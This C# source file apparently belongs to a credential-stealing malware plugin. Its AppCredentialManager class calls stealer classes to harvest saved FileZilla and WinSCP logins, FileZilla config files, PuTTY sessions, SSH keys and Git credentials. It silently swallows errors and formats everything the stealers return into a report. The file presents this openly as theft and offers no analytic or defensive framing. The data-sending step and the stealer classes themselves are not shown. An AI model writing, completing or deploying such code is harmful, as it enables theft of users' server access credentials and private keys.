using System;
using System.Collections.Generic;
using System.Text;

namespace Plugin.Apps
{
    public class AppCredentialManager
    {
        public static Dictionary<string, object> StealAllAppCredentials()
        {
            Dictionary<string, object> allCredentials = new Dictionary<string, object>();
            
            try
            {
                // FileZilla
                List<FileZillaCredential> fileZillaCreds = FileZillaStealer.ExtractCredentials();
                if (fileZillaCreds.Count > 0)
                {
                    allCredentials["FileZilla_Credentials"] = fileZillaCreds;
                }
                
                Dictionary<string, byte[]> fileZillaFiles = FileZillaStealer.StealConfigFiles();
                if (fileZillaFiles.Count > 0)
                {
                    allCredentials["FileZilla_Files"] = fileZillaFiles;
                }
            }
            catch { }
            
            try
            {
                // WinSCP
                List<WinSCPCredential> winscpCreds = WinSCPStealer.ExtractCredentials();
                if (winscpCreds.Count > 0)
                {
                    allCredentials["WinSCP_Credentials"] = winscpCreds;
                }
            }
            catch { }
            
            try
            {
                // PuTTY
                List<PuTTYSession> puttySessions = PuTTYStealer.ExtractSessions();
                if (puttySessions.Count > 0)
                {
                    allCredentials["PuTTY_Sessions"] = puttySessions;
                }
                
                Dictionary<string, string> sshKeys = PuTTYStealer.ExtractSSHKeys();
                if (sshKeys.Count > 0)
                {
                    allCredentials["PuTTY_SSH_Keys"] = sshKeys;
                }
            }
            catch { }
            
            try
            {
                // Git
                Dictionary<string, string> gitCreds = GitCredentialStealer.ExtractGitCredentials();
                if (gitCreds.Count > 0)
                {
                    allCredentials["Git_Credentials"] = gitCreds;
                }
            }
            catch { }
            
            return allCredentials;
        }
        
        public static string FormatCredentialsReport()
        {
            StringBuilder report = new StringBuilder();
            Dictionary<string, object> allData = StealAllAppCredentials();
            
            report.AppendLine("=== Application Credentials Report ===\n");
            
            foreach (KeyValuePair<string, object> kvp in allData)
            {
                report.AppendLine($"[{kvp.Key}]");
                
                if (kvp.Value is List<FileZillaCredential>)
                {
                    foreach (FileZillaCredential cred in (List<FileZillaCredential>)kvp.Value)
                    {
                        report.AppendLine($"  {cred}");
                    }
                }
                else if (kvp.Value is List<WinSCPCredential>)
                {
                    foreach (WinSCPCredential cred in (List<WinSCPCredential>)kvp.Value)
                    {
                        report.AppendLine($"  {cred}");
                    }
                }
                else if (kvp.Value is List<PuTTYSession>)
                {
                    foreach (PuTTYSession session in (List<PuTTYSession>)kvp.Value)
                    {
                        report.AppendLine($"  {session}");
                    }
                }
                else if (kvp.Value is Dictionary<string, string>)
                {
                    foreach (KeyValuePair<string, string> item in (Dictionary<string, string>)kvp.Value)
                    {
                        report.AppendLine($"  {item.Key}: {item.Value}");
                    }
                }
                
                report.AppendLine();
            }
            
            return report.ToString();
        }
    }
}
